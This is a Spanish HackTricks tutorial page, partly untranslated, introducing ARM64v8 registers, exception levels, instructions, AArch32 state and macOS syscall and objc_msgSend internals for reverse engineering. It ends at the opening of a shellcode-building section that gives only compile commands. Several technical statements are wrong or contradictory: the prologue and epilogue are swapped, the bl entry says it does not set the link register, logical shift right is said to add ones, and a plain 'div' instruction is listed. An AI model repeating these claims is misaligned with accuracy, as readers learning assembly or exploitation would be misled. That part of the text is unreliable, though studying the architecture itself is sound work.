# Introducción a ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Exception Levels - EL (ARM64v8)**

En la arquitectura ARMv8, los niveles de ejecución, conocidos como Exception Levels (ELs), definen el nivel de privilegio y las capacidades del entorno de ejecución. Hay cuatro exception levels, que van desde EL0 hasta EL3, cada uno con un propósito diferente:

1. **EL0 - User Mode**:
- Este es el nivel menos privilegiado y se usa para ejecutar código de aplicaciones normales.
- Las aplicaciones que se ejecutan en EL0 están aisladas entre sí y del software del sistema, mejorando la seguridad y la estabilidad.
2. **EL1 - Operating System Kernel Mode**:
- La mayoría de los kernels de los sistemas operativos se ejecutan en este nivel.
- EL1 tiene más privilegios que EL0 y puede acceder a los recursos del sistema, pero con algunas restricciones para asegurar la integridad del sistema.
3. **EL2 - Hypervisor Mode**:
- Este nivel se usa para virtualización. Un hypervisor que se ejecuta en EL2 puede gestionar múltiples sistemas operativos (cada uno en su propio EL1) ejecutándose en el mismo hardware físico.
- EL2 proporciona características para el aislamiento y control de los entornos virtualizados.
4. **EL3 - Secure Monitor Mode**:
- Este es el nivel más privilegiado y a menudo se usa para secure boot y entornos de ejecución de confianza.
- EL3 puede gestionar y controlar los accesos entre estados secure y non-secure (como secure boot, trusted OS, etc.).

El uso de estos niveles permite una forma estructurada y segura de gestionar distintos aspectos del sistema, desde las aplicaciones de usuario hasta el software del sistema con mayores privilegios. El enfoque de ARMv8 sobre los niveles de privilegio ayuda a aislar efectivamente los distintos componentes del sistema, mejorando así la seguridad y la robustez del sistema.

## **Registers (ARM64v8)**

ARM64 tiene **31 registros de propósito general**, etiquetados `x0` hasta `x30`. Cada uno puede almacenar un valor de **64 bits** (8 bytes). Para operaciones que requieren solo valores de 32 bits, los mismos registros pueden accederse en modo de 32 bits usando los nombres `w0` hasta `w30`.

1. **`x0`** a **`x7`** - Normalmente se usan como registros temporales y para pasar parámetros a subrutinas.
- **`x0`** también transporta los datos de retorno de una función
2. **`x8`** - En el kernel de Linux, `x8` se usa como el número de syscall para la instrucción `svc`. **In macOS the x16 is the one used!**
3. **`x9`** a **`x15`** - Más registros temporales, usados frecuentemente para variables locales.
4. **`x16`** y **`x17`** - **Intra-procedural Call Registers**. Registros temporales para valores inmediatos. También se usan para llamadas indirectas a funciones y stubs de PLT (Procedure Linkage Table).
- **`x16`** se usa como el **system call number** para la instrucción **`svc`** en **macOS**.
5. **`x18`** - **Platform register**. Puede usarse como un registro de propósito general, pero en algunas plataformas este registro está reservado para usos específicos de la plataforma: puntero al bloque de entorno del hilo actual en Windows, o para apuntar a la **estructura de tarea actualmente ejecutada en el kernel de linux**.
6. **`x19`** a **`x28`** - Estos son registros preservados por el callee. Una función debe preservar los valores de estos registros para su caller, por lo que se almacenan en la pila y se recuperan antes de volver al caller.
7. **`x29`** - **Frame pointer** para llevar la pista del frame de la pila. Cuando se crea un nuevo frame de pila porque se llama a una función, el registro **`x29`** se **almacena en la pila** y la dirección del **nuevo** frame pointer (la dirección de **`sp`**) se **almacena en este registro**.
- Este registro también puede usarse como un **registro de propósito general** aunque usualmente se usa como referencia para **variables locales**.
8. **`x30`** or **`lr`**- **Link register**. Contiene la **dirección de retorno** cuando se ejecuta una instrucción `BL` (Branch with Link) o `BLR` (Branch with Link to Register) almacenando el valor de **`pc`** en este registro.
- También puede usarse como cualquier otro registro.
- Si la función actual va a llamar a una nueva función y por tanto sobrescribir `lr`, lo almacenará en la pila al principio; esto es el epílogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) y lo recupera al final; esto es el prólogo (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, usado para llevar la pista del tope de la pila.
- el valor de **`sp`** debe mantenerse siempre con al menos una **alineación de quadword** o puede ocurrir una excepción de alineación.
10. **`pc`** - **Program counter**, que apunta a la siguiente instrucción. Este registro solo puede actualizarse mediante la generación de excepciones, retornos de excepción y branches. Las únicas instrucciones ordinarias que pueden leer este registro son las branch with link (BL, BLR) para almacenar la dirección de **`pc`** en **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. También llamado **`wzr`** en su forma de registro **32**-bit. Puede usarse para obtener fácilmente el valor cero (operación común) o para realizar comparaciones usando **`subs`** como **`subs XZR, Xn, #10`** almacenando los datos resultantes en ninguna parte (en **`xzr`**).

Los registros **`Wn`** son la versión de **32 bit** del registro **`Xn`**.

> [!TIP]
> Los registros de X0 - X18 son volátiles, lo que significa que sus valores pueden cambiar por llamadas a funciones e interrupciones. Sin embargo, los registros de X19 - X28 son no volátiles, lo que significa que sus valores deben preservarse a través de llamadas a funciones ("callee saved").

### SIMD and Floating-Point Registers

Además, hay otros **32 registros de 128bit** que pueden usarse en operaciones SIMD (single instruction multiple data) optimizadas y para realizar aritmética en coma flotante. Estos se llaman registros Vn aunque también pueden operar en **64**-bit, **32**-bit, **16**-bit y **8**-bit y entonces se denominan **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** y **`Bn`**.

### System Registers

**Hay cientos de system registers**, también llamados special-purpose registers (SPRs), que se usan para **monitorizar** y **controlar** el comportamiento de los **procesadores**.\
Solo pueden leerse o establecerse usando las instrucciones especiales dedicadas **`mrs`** y **`msr`**.

Los registros especiales **`TPIDR_EL0`** y **`TPIDDR_EL0`** se encuentran comúnmente al realizar reverse engineering. El sufijo `EL0` indica la **exception mínima** desde la cual el registro puede ser accedido (en este caso EL0 es el nivel de excepción (privilegio) regular con el que se ejecutan los programas ordinarios).\
A menudo se usan para almacenar la **dirección base del thread-local storage** en memoria. Normalmente el primero es legible y escribible por programas que se ejecutan en EL0, pero el segundo puede leerse desde EL0 y escribirse desde EL1 (como el kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene varios componentes del proceso serializados en el registro especial visible por el sistema operativo **`SPSR_ELx`**, siendo X el **nivel de permiso de la excepción desencadenada** (esto permite recuperar el estado del proceso cuando la excepción finaliza).\
Estos son los campos accesibles:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Las banderas de condición **`N`**, **`Z`**, **`C`** y **`V`**:
- **`N`** significa que la operación produjo un resultado negativo
- **`Z`** significa que la operación produjo cero
- **`C`** significa que la operación produjo carry
- **`V`** significa que la operación produjo un overflow con signo:
- La suma de dos números positivos produce un resultado negativo.
- La suma de dos números negativos produce un resultado positivo.
- En la resta, cuando se resta un número negativo grande de un número positivo más pequeño (o viceversa), y el resultado no puede representarse dentro del rango del tamaño de bits dado.
- Obviamente el procesador no sabe si la operación es con signo o sin signo, por lo que comprobará C y V en las operaciones e indicará si ocurrió un carry en caso de que fuera con signo o sin signo.

> [!WARNING]
> No todas las instrucciones actualizan estas banderas. Algunas como **`CMP`** o **`TST`** sí lo hacen, y otras que tienen un sufijo s como **`ADDS`** también lo hacen.

- La **actual ancho de registro (`nRW`) flag**: Si la bandera tiene el valor 0, el programa se ejecutará en el estado de ejecución AArch64 una vez reanudado.
- El **Exception Level** actual (**`EL`**): Un programa regular ejecutándose en EL0 tendrá el valor 0
- La bandera de **single stepping** (**`SS`**): Usada por depuradores para ejecutar paso a paso poniendo la bandera SS a 1 dentro de **`SPSR_ELx`** a través de una excepción. El programa ejecutará un paso y emitirá una excepción de single step.
- La bandera de **illegal exception state** (**`IL`**): Se usa para marcar cuando un software privilegiado realiza una transferencia de nivel de excepción inválida, esta bandera se pone a 1 y el procesador desencadena una excepción de estado ilegal.
- Las banderas **`DAIF`**: Estas banderas permiten que un programa privilegiado enmascare selectivamente ciertas excepciones externas.
- Si **`A`** es 1 significa que se dispararán **asynchronous aborts**. La **`I`** configura la respuesta a las solicitudes externas de interrupción de hardware (IRQs). y la F está relacionada con **Fast Interrupt Requests** (FIRs).
- Las banderas de **selección de puntero de pila** (**`SPS`**): Los programas privilegiados que se ejecutan en EL1 y superiores pueden alternar entre usar su propio registro de puntero de pila y el del modo usuario (por ejemplo entre `SP_EL1` y `EL0`). Este cambio se realiza escribiendo en el registro especial **`SPSel`**. Esto no puede hacerse desde EL0.

## **Calling Convention (ARM64v8)**

La calling convention de ARM64 especifica que los **primeros ocho parámetros** a una función se pasan en los registros **`x0` hasta `x7`**. Los parámetros **adicionales** se pasan en la **pila**. El valor de **retorno** se devuelve en el registro **`x0`**, o también en **`x1`** si tiene **128 bits** de longitud. Los registros **`x19`** a **`x30`** y **`sp`** deben **preservarse** a través de las llamadas a funciones.

Al leer una función en ensamblador, busca el **prologue** y el **epilogue** de la función. El **prologue** normalmente implica **guardar el frame pointer (`x29`)**, **configurar** un **nuevo frame pointer** y **asignar espacio en la pila**. El **epilogue** normalmente implica **restaurar el frame pointer guardado** y **retornar** desde la función.

### Calling Convention in Swift

Swift tiene su propia **calling convention** que puede encontrarse en [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

Las instrucciones ARM64 generalmente tienen el **formato `opcode dst, src1, src2`**, donde **`opcode`** es la **operación** a realizar (como `add`, `sub`, `mov`, etc.), **`dst`** es el registro **destino** donde se almacenará el resultado, y **`src1`** y **`src2`** son los registros **origen**. También se pueden usar valores inmediatos en lugar de registros fuente.

- **`mov`**: **Mover** un valor de un **registro** a otro.
- Ejemplo: `mov x0, x1` — Esto mueve el valor de `x1` a `x0`.
- **`ldr`**: **Cargar** un valor desde **memoria** a un **registro**.
- Ejemplo: `ldr x0, [x1]` — Esto carga un valor desde la dirección de memoria apuntada por `x1` en `x0`.
- **Modo offset**: Se indica un offset que afecta al puntero origen, por ejemplo:
- `ldr x2, [x1, #8]`, esto cargará en x2 el valor desde x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, esto cargará en x2 un objeto del array x0, desde la posición x1 (índice) * 4
- **Modo pre-indexado**: Esto aplicará cálculos al origen, obtendrá el resultado y también almacenará el nuevo origen en el registro origen.
- `ldr x2, [x1, #8]!`, esto cargará `x1 + 8` en `x2` y almacenará en x1 el resultado de `x1 + 8`
- `str lr, [sp, #-4]!`, Almacena el link register en sp y actualiza el registro sp
- **Modo post-index**: Esto es como el anterior pero la dirección de memoria se accede y luego se calcula y almacena el offset.
- `ldr x0, [x1], #8`, carga `x1` en `x0` y actualiza x1 con `x1 + 8`
- **Direccionamiento relativo a PC**: En este caso la dirección a cargar se calcula relativa al registro PC
- `ldr x1, =_start`, Esto cargará la dirección donde comienza el símbolo `_start` en x1 en relación con el PC actual.
- **`str`**: **Almacenar** un valor desde un **registro** en **memoria**.
- Ejemplo: `str x0, [x1]` — Esto almacena el valor de `x0` en la ubicación de memoria apuntada por `x1`.
- **`ldp`**: **Load Pair of Registers**. Esta instrucción **carga dos registros** desde **memoria consecutiva**. La dirección de memoria típicamente se forma sumando un offset al valor en otro registro.
- Ejemplo: `ldp x0, x1, [x2]` — Esto carga `x0` y `x1` desde las ubicaciones de memoria en `x2` y `x2 + 8`, respectivamente.
- **`stp`**: **Store Pair of Registers**. Esta instrucción **almacena dos registros** en **memoria consecutiva**. La dirección de memoria típicamente se forma sumando un offset al valor en otro registro.
- Ejemplo: `stp x0, x1, [sp]` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `sp` y `sp + 8`, respectivamente.
- `stp x0, x1, [sp, #16]!` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `sp+16` y `sp + 24`, respectivamente, y actualiza `sp` con `sp+16`.
- **`add`**: **Sumar** los valores de dos registros y almacenar el resultado en un registro.
- Sintaxis: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destino
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registro o inmediato)
- \[shift #N | RRX] -> Realiza un shift o llama a RRX
- Ejemplo: `add x0, x1, x2` — Esto suma los valores en `x1` y `x2` y almacena el resultado en `x0`.
- `add x5, x5, #1, lsl #12` — Esto equivale a 4096 (un 1 desplazado 12 veces) -> 1 0000 0000 0000 0000
- **`adds`** Esto realiza un `add` y actualiza las banderas
- **`sub`**: **Restar** los valores de dos registros y almacenar el resultado en un registro.
- Revisa la **sintaxis** de **`add`**.
- Ejemplo: `sub x0, x1, x2` — Esto resta el valor en `x2` de `x1` y almacena el resultado en `x0`.
- **`subs`** Esto es como sub pero actualizando las banderas
- **`mul`**: **Multiplicar** los valores de **dos registros** y almacenar el resultado en un registro.
- Ejemplo: `mul x0, x1, x2` — Esto multiplica los valores en `x1` y `x2` y almacena el resultado en `x0`.
- **`div`**: **Dividir** el valor de un registro por otro y almacenar el resultado en un registro.
- Ejemplo: `div x0, x1, x2` — Esto divide el valor en `x1` por `x2` y almacena el resultado en `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Añade 0s al final moviendo los otros bits hacia adelante (multiplicar por 2^n)
- **Logical shift right**: Añade 1s al principio moviendo los otros bits hacia atrás (dividir por 2^n en unsigned)
- **Arithmetic shift right**: Como **`lsr`**, pero en lugar de añadir 0s si el bit más significativo es 1, se añaden 1s (divide por 2^n en signed)
- **Rotate right**: Como **`lsr`** pero lo que se quita por la derecha se añade por la izquierda
- **Rotate Right with Extend**: Como **`ror`**, pero con la bandera de carry como el "bit más significativo". Así la bandera de carry se mueve al bit 31 y el bit removido a la bandera de carry.
- **`bfm`**: **Bit Filed Move**, estas operaciones **copian bits `0...n`** desde un valor y los colocan en posiciones **`m..m+n`**. El **`#s`** especifica la **posición del bit más a la izquierda** y **`#r`** la **cantidad de rotación a la derecha**.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Copia un campo de bits desde un registro y lo copia a otro registro.
- **`BFI X1, X2, #3, #4`** Inserta 4 bits de X2 desde el bit 3 en X1
- **`BFXIL X1, X2, #3, #4`** Extrae desde el bit 3 de X2 cuatro bits y los copia en X1
- **`SBFIZ X1, X2, #3, #4`** Extiende con signo 4 bits de X2 e insertarlos en X1 empezando en la posición de bit 3, poniendo a cero los bits a la derecha
- **`SBFX X1, X2, #3, #4`** Extrae 4 bits empezando en el bit 3 de X2, los extiende con signo y coloca el resultado en X1
- **`UBFIZ X1, X2, #3, #4`** Extiende con ceros 4 bits de X2 e insertarlos en X1 empezando en la posición de bit 3, poniendo a cero los bits a la derecha
- **`UBFX X1, X2, #3, #4`** Extrae 4 bits empezando en el bit 3 de X2 y coloca el resultado extendido con ceros en X1.
- **Sign Extend To X:** Extiende el signo (o añade solo 0s en la versión unsigned) de un valor para poder realizar operaciones con él:
- **`SXTB X1, W2`** Extiende el signo de un byte **desde W2 a X1** (`W2` es la mitad de `X2`) para rellenar los 64 bits
- **`SXTH X1, W2`** Extiende el signo de un número de 16 bits **desde W2 a X1** para rellenar los 64 bits
- **`SXTW X1, W2`** Extiende el signo de un byte **desde W2 a X1** para rellenar los 64 bits
- **`UXTB X1, W2`** Añade 0s (unsigned) a un byte **desde W2 a X1** para rellenar los 64 bits
- **`extr`:** Extrae bits de un **par de registros concatenados** especificado.
- Ejemplo: `EXTR W3, W2, W1, #3` Esto **concatenará W1+W2** y obtendrá **desde el bit 3 de W2 hasta el bit 3 de W1** y lo almacenará en W3.
- **`cmp`**: **Comparar** dos registros y establecer las banderas de condición. Es un **alias de `subs`** que establece el registro destino al registro cero. Útil para saber si `m == n`.
- Soporta la **misma sintaxis que `subs`**
- Ejemplo: `cmp x0, x1` — Esto compara los valores en `x0` y `x1` y establece las banderas de condición en consecuencia.
- **`cmn`**: **Compare negative** operando. En este caso es un **alias de `adds`** y soporta la misma sintaxis. Útil para saber si `m == -n`.
- **`ccmp`**: Comparación condicional, es una comparación que se realizará solo si una comparación previa fue verdadera y establecerá específicamente bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 y x3 < x4, salta a func
- Esto es porque **`ccmp`** solo se ejecutará si la **`cmp`** previa fue `NE`, si no lo fue los bits `nzcv` se establecerán a 0 (lo que no satisfará la comparación `blt`).
- Esto también puede usarse como `ccmn` (igual pero negativo, como `cmp` vs `cmn`).
- **`tst`**: Comprueba si alguno de los valores de la comparación tiene bits en 1 (funciona como un ANDS sin almacenar el resultado en ninguna parte). Es útil para comprobar un registro con un valor y ver si alguno de los bits del registro indicado en el valor es 1.
- Ejemplo: `tst X1, #7` Comprueba si alguno de los últimos 3 bits de X1 es 1
- **`teq`**: Operación XOR descartando el resultado
- **`b`**: Branch incondicional
- Ejemplo: `b myFunction`
- Ten en cuenta que esto no llenará el link register con la dirección de retorno (no es adecuado para llamadas a subrutinas que necesitan volver)
- **`bl`**: **Branch** con link, usado para **llamar** a una **subrutina**. Almacena la **dirección de retorno en `x30`**.
- Ejemplo: `bl myFunction` — Esto llama a la función `myFunction` y almacena la dirección de retorno en `x30`.
- Ten en cuenta que esto no llenará el link register con la dirección de retorno (no es adecuado para llamadas a subrutinas que necesitan volver)
- **`blr`**: **Branch** con Link a Registro, usado para **llamar** a una **subrutina** donde el objetivo está **especificado** en un **registro**. Almacena la dirección de retorno en `x30`. (Esto es
- Ejemplo: `blr x1` — Esto llama a la función cuya dirección está contenida en `x1` y almacena la dirección de retorno en `x30`.
- **`ret`**: **Retornar** desde una **subrutina**, típicamente usando la dirección en **`x30`**.
- Ejemplo: `ret` — Esto retorna desde la subrutina actual usando la dirección de retorno en `x30`.
- **`b.<cond>`**: Branchs condicionales
- **`b.eq`**: **Branch si es igual**, basado en la instrucción `cmp` previa.
- Ejemplo: `b.eq label` — Si la instrucción `cmp` previa encontró dos valores iguales, esto salta a `label`.
- **`b.ne`**: **Branch si No Igual**. Esta instrucción comprueba las banderas de condición (que fueron establecidas por una instrucción de comparación previa), y si los valores comparados no eran iguales, salta a una etiqueta o dirección.
- Ejemplo: Después de una instrucción `cmp x0, x1`, `b.ne label` — Si los valores en `x0` y `x1` no eran iguales, esto salta a `label`.
- **`cbz`**: **Compare and Branch on Zero**. Esta instrucción compara un registro con cero, y si son iguales, hace branch a una etiqueta o dirección.
- Ejemplo: `cbz x0, label` — Si el valor en `x0` es cero, esto salta a `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Esta instrucción compara un registro con cero, y si no son iguales, hace branch a una etiqueta o dirección.
- Ejemplo: `cbnz x0, label` — Si el valor en `x0` no es cero, esto salta a `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Ejemplo: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Ejemplo: `tbz x0, #8, label`
- **Operaciones de selección condicional**: Son operaciones cuyo comportamiento varía dependiendo de los bits de condición.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Si es true, X0 = X1, si es false, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Si es true, Xd = Xn, si es false, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Si es true, Xd = Xn + 1, si es false, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Si es true, Xd = Xn, si es false, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Si es true, Xd = NOT(Xn), si es false, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Si es true, Xd = Xn, si es false, Xd = - Xm
- `cneg Xd, Xn, cond` -> Si es true, Xd = - Xn, si es false, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Si es true, Xd = 1, si es false, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Si es true, Xd = \<all 1>, si es false, Xd = 0
- **`adrp`**: Calcula la **dirección de página de un símbolo** y la almacena en un registro.
- Ejemplo: `adrp x0, symbol` — Esto calcula la dirección de página de `symbol` y la almacena en `x0`.
- **`ldrsw`**: **Carga** un valor **signed 32-bit** desde memoria y lo **sign-extend a 64** bits.
- Ejemplo: `ldrsw x0, [x1]` — Esto carga un valor signed de 32 bits desde la dirección en `x1`, lo sign-extiende a 64 bits y lo almacena en `x0`.
- **`stur`**: **Almacenar un valor de registro en una ubicación de memoria**, usando un offset desde otro registro.
- Ejemplo: `stur x0, [x1, #4]` — Esto almacena el valor en `x0` en la dirección de memoria que es 4 bytes mayor que la dirección actualmente en `x1`.
- **`svc`** : Hacer una **system call**. Significa "Supervisor Call". Cuando el procesador ejecuta esta instrucción, **cambia de user mode a kernel mode** y salta a una ubicación específica en memoria donde está el código de manejo de system call del **kernel**.

- Ejemplo:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurar el nuevo puntero de marco**: `mov x29, sp` (configura el nuevo puntero de marco para la función actual)
3. **Reservar espacio en la pila para variables locales** (si es necesario): `sub sp, sp, <size>` (donde `<size>` es el número de bytes necesarios)

### **Epílogo de la función**

1. **Liberar espacio de variables locales (si se asignaron)**: `add sp, sp, <size>`
2. **Restaurar el registro de enlace y el puntero de marco**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Retorno**: `ret` (devuelve el control al llamador usando la dirección en el registro de enlace)

## Estado de Ejecución AARCH32

Armv8-A soporta la ejecución de programas de 32 bits. **AArch32** puede ejecutarse en uno de **dos conjuntos de instrucciones**: **`A32`** y **`T32`**, y puede cambiar entre ellos mediante **`interworking`**.\
**Privilegiados** programas de 64 bits pueden programar la **ejecución de programas de 32 bits** ejecutando una transferencia de nivel de excepción al 32-bit de privilegios inferiores.\
Tenga en cuenta que la transición de 64 bits a 32 bits ocurre con un nivel de excepción inferior (por ejemplo, un programa de 64 bits en EL1 que activa un programa en EL0). Esto se realiza estableciendo el **bit 4 de** **`SPSR_ELx`** registro especial **a 1** cuando el hilo de proceso `AArch32` está listo para ejecutarse y el resto de `SPSR_ELx` almacena el CPSR del programa **`AArch32`**. Luego, el proceso privilegiado llama a la instrucción **`ERET`** para que el procesador transicione a **`AArch32`**, entrando en A32 o T32 dependiendo de CPSR**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. Esto básicamente equivale a establecer el **bit menos significativo a 1** para indicar que el conjunto de instrucciones es T32.\
Esto se establece durante las **interworking branch instructions,** pero también puede establecerse directamente con otras instrucciones cuando el PC se establece como el registro destino. Ejemplo:

Otro ejemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registros

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

- **`r15`**: Contador de programa (siempre). Contiene la dirección de la siguiente instrucción. In A32 current + 8, in T32, current + 4.
- **`r11`**: Puntero de marco
- **`r12`**: Registro de llamadas intra-procedimiento
- **`r13`**: Stack Pointer (Nota: la pila siempre está alineada a 16 bytes)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **conmutación rápida de contexto** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Registro de estado del programa actual

In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

The fields are divided in some groups:

- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
- Execution State Registers: Process behaviour (managed by the OS).

#### Application Program Status Register (APSR)

- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
- The **`Q`** flag: It's set to 1 whenever **saturación de enteros** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
- **`GE`** (Mayor o igual) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.

For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **desbordamiento**.

The **`SEL`** instruction uses these GE flags to perform conditional actions.

#### Execution State Registers

- The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
- **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
- **`E`** bit: Indicates the **endianness**.
- **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> A veces es más fácil revisar el código **descompilado** de **`libsystem_kernel.dylib`** **que** revisar el **código fuente**, porque el código de varias syscalls (BSD and Mach) se genera mediante scripts (revisa los comentarios en el código fuente) mientras que en el dylib puedes ver qué se está llamando.

### machdep calls

XNU soporta otro tipo de llamadas llamadas machine dependent. Los números de estas llamadas dependen de la arquitectura y ni las llamadas ni los números están garantizados a permanecer constantes.

### comm page

Esta es una página de memoria propiedad del kernel que se mapea en el address space de cada proceso de usuario. Está pensada para hacer la transición de user mode a kernel space más rápida que usando syscalls para servicios del kernel que se usan tanto que esta transición sería muy ineficiente.

Por ejemplo la llamada `gettimeofdate` lee el valor de `timeval` directamente desde la comm page.

### objc_msgSend

Es muy común encontrar esta función usada en programas Objective-C o Swift. Esta función permite llamar un método de un objeto Objective-C.

Parámetros ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Puntero a la instancia
- x1: op -> Selector del método
- x2... -> Resto de los argumentos del método invocado

Así que, si pones un breakpoint antes de la rama a esta función, puedes encontrar fácilmente qué se invoca en lldb con (en este ejemplo el objeto llama a un objeto de `NSConcreteTask` que ejecutará un comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Estableciendo la variable de entorno **`NSObjCMessageLoggingEnabled=1`** es posible registrar cuándo se llama a esta función en un archivo como `/tmp/msgSends-pid`.
>
> Además, estableciendo **`OBJC_HELP=1`** y ejecutando cualquier binario puedes ver otras variables de entorno que podrías usar para **log** cuando ocurren ciertas acciones Objc-C.

Cuando se llama a esta función, es necesario encontrar el método invocado de la instancia indicada; para ello se realizan las siguientes búsquedas:

- Realizar búsqueda optimista en cache:
- Si tiene éxito, listo
- Adquirir runtimeLock (lectura)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Probar cache propia de la clase:
- Si tiene éxito, listo
- Intentar la lista de métodos de la clase:
- Si se encuentra, llenar cache y listo
- Probar cache de la superclass:
- Si tiene éxito, listo
- Intentar la lista de métodos de la superclass:
- Si se encuentra, llenar cache y listo
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extraer los bytes:
```bash
